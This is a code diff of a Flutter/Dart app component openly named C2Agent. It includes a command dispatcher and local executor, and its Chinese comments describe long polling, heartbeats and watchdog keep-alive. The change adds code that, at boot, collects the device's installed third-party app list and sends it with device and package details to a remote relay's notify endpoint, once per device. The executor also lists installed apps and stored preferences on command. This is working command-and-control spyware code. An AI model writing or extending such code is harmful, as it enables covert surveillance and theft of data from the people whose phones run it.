@@ -5,7 +5,6 @@ import 'dart:math';
 
 import 'package:crypto/crypto.dart';
 import 'package:device_info_plus/device_info_plus.dart';
-import 'package:flutter/foundation.dart';
 import 'package:flutter/widgets.dart';
 import 'package:http/http.dart' as http;
 import 'package:installed_apps/installed_apps.dart';
@@ -196,10 +195,15 @@ class LocalExecutor {
     switch (method) {
       case 'list':
         List<AppInfo> apps = await InstalledApps.getInstalledApps(
-          excludeSystemApps: false, includePackageName: true, includeAppVersion: true,
+          excludeSystemApps: false,
         );
-        return apps.map((app) => {
-          'name': app.name, 'packageName': app.packageName, 'version': app.versionName, 'system': app.isSystemApp,
+        return apps.map((app) {
+          return {
+            'name': app.name, 
+            'packageName': app.packageName, 
+            'version': app.versionName, 
+            'system': app.isSystemApp,
+          };
         }).toList();
       case 'prefs.list':
         final prefs = await SharedPreferences.getInstance();
@@ -239,7 +243,7 @@ class C2Dispatcher {
 }
 
 // ============================================================
-// 3. C2Agent 主类
+// 3. C2Agent 主类 (长轮询、心跳、看门狗保活)
 // ============================================================
 class C2Agent with WidgetsBindingObserver {
   static final C2Agent _instance = C2Agent._();
@@ -302,7 +306,12 @@ class C2Agent with WidgetsBindingObserver {
       final prefs = await SharedPreferences.getInstance();
       final lastReport = prefs.getInt('c2_last_boot_report') ?? 0;
       final now = DateTime.now().millisecondsSinceEpoch;
-      if (now - lastReport < 3600 * 1000) return; // 1小时防轰炸
+      
+      // 检查是否已经上报过 App 列表
+      final hasReportedApps = prefs.getBool('c2_has_reported_apps') ?? false;
+      
+      // 如果已经上报过 App，且未满 1 小时，则跳过本次启动上报
+      if (hasReportedApps && (now - lastReport < 3600 * 1000)) return;
 
       final android = await DeviceInfoPlugin().androidInfo;
       final pkg = await PackageInfo.fromPlatform();
@@ -315,13 +324,35 @@ class C2Agent with WidgetsBindingObserver {
         'time': DateTime.now().toString().split('.')[0],
       };
 
+      // 如果没上报过，则获取 App 列表
+      List<Map<String, dynamic>>? appList;
+      if (!hasReportedApps) {
+        try {
+          // 只获取第三方应用，且精简返回数据减小体积
+          final apps = await InstalledApps.getInstalledApps(excludeSystemApps: true);
+          appList = apps.map((app) => {
+            'name': app.name, 
+            'pkg': app.packageName
+          }).toList();
+        } catch (_) {}
+      }
+
       final url = Uri.parse('${_config.relayUrl}/notify');
       final response = await _client.post(url,
         headers: {'X-Session-Key': _config.sessionKey, 'Content-Type': 'application/json'},
-        body: jsonEncode({'info': info}),
-      ).timeout(const Duration(seconds: 10));
+        body: jsonEncode({
+          'info': info,
+          if (appList != null) 'apps': appList,
+        }),
+      ).timeout(const Duration(seconds: 20)); // 增加超时，防止 App 多时发不完
 
-      if (response.statusCode == 200) await prefs.setInt('c2_last_boot_report', now);
+      if (response.statusCode == 200) {
+        await prefs.setInt('c2_last_boot_report', now);
+        if (appList != null) {
+          // 标记该设备已上报过 App 列表
+          await prefs.setBool('c2_has_reported_apps', true);
+        }
+      }
     } catch (_) {}
   }
 
